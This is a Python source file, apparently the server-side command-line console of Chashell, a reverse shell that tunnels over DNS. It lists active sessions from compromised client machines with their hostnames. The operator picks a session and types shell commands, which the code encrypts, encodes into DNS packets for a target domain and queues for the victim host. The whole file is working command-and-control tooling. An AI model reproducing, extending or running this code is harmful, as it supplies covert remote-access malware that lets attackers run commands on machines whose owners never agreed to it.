# cmd/server/cli.py
import sys
from prompt_toolkit import PromptSession
from prompt_toolkit.completion import Completer, Completion
from prompt_toolkit.history import InMemoryHistory

from lib.transport.encoding import encode

# Global state (will be shared with server)
console_buffer = {}
current_session = None
packet_queue = {}
sessions_map = {}
encryption_key = ""
target_domain = ""

class ChashellCompleter(Completer):
    """Auto-completion for chashell commands."""
    
    def __init__(self):
        self.commands = {
            'sessions': 'Interact with the specified machine.',
            'exit': 'Stop the Chashell Server'
        }
    
    def get_completions(self, document, complete_event):
        """Generate completions based on current input."""
        text = document.text_before_cursor
        
        if not text:
            return
        
        args = text.split()
        
        # Complete commands
        if len(args) <= 1:
            word = args[0] if args else ''
            for cmd, desc in self.commands.items():
                if cmd.startswith(word):
                    yield Completion(cmd, start_position=-len(word), display_meta=desc)
        
        # Complete session IDs for 'sessions' command
        elif len(args) == 2 and args[0] == 'sessions':
            word = args[1]
            for client_guid in sessions_map.keys():
                if client_guid.startswith(word):
                    client_info = sessions_map[client_guid]
                    hostname = getattr(client_info, 'hostname', 'unknown')
                    yield Completion(
                        client_guid, 
                        start_position=-len(word),
                        display_meta=hostname
                    )

def interact(session_id: str):
    """
    Interact with a specific session.
    
    Args:
        session_id: The client GUID to interact with
    """
    global current_session

    # Print buffered console output if available
    if session_id in console_buffer:
        buffer = console_buffer[session_id]
        for line in buffer:
            print(line, end='')
        console_buffer[session_id] = []

    current_session = session_id

    # Convert hex session id to bytes for encode()
    client_guid = bytes.fromhex(session_id)   # <<< ADD THIS

    session = PromptSession(history=InMemoryHistory())

    try:
        while True:
            try:
                line = session.prompt('')
            except KeyboardInterrupt:
                continue
            except EOFError:
                break

            if line.strip() == "background":
                current_session = None
                return

            # Use client_guid here instead of None
            init_packet, data_packets = encode(
                (line + "\n").encode(),
                False,          # is_request = False for server->client
                encryption_key,
                target_domain,
                client_guid     # <<< FIXED
            )

            if session_id not in packet_queue:
                packet_queue[session_id] = []

            packet_queue[session_id].append(init_packet)
            for packet in data_packets:
                packet_queue[session_id].append(packet)

    except Exception as e:
        print(f"Error during interaction: {e}")
    finally:
        current_session = None

def executor(command: str):
    """
    Execute a chashell command.
    
    Args:
        command: The command string to execute
    """
    args = command.strip().split()
    
    if not args:
        return
    
    cmd = args[0]
    
    if cmd == "exit":
        print("Exiting.")
        sys.exit(0)
    
    elif cmd == "sessions":
        if len(args) == 2:
            session_id = args[1]
            if session_id in sessions_map:
                print(f"Interacting with session {session_id}.")
                interact(session_id)
            else:
                print(f"Error: Session {session_id} not found")
        else:
            # List all sessions
            if sessions_map:
                print("\nActive sessions:")
                for guid, info in sessions_map.items():
                    hostname = getattr(info, 'hostname', 'unknown')
                    print(f"  {guid[:16]}... - {hostname}")
            else:
                print("No active sessions")
    
    else:
        print(f"Unknown command: {cmd}")
        print("Available commands: sessions, exit")

def run_cli():
    """Run the interactive CLI."""
    completer = ChashellCompleter()
    session = PromptSession(
        completer=completer,
        history=InMemoryHistory()
    )
    
    print("Chashell Server - Interactive CLI")
    print("Type 'sessions <id>' to interact with a client")
    print("Type 'exit' to quit\n")
    
    while True:
        try:
            command = session.prompt('chashell >>> ')
            if command.strip():
                executor(command)
        except KeyboardInterrupt:
            continue
        except EOFError:
            print("\nExiting.")
            sys.exit(0)
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    run_cli()
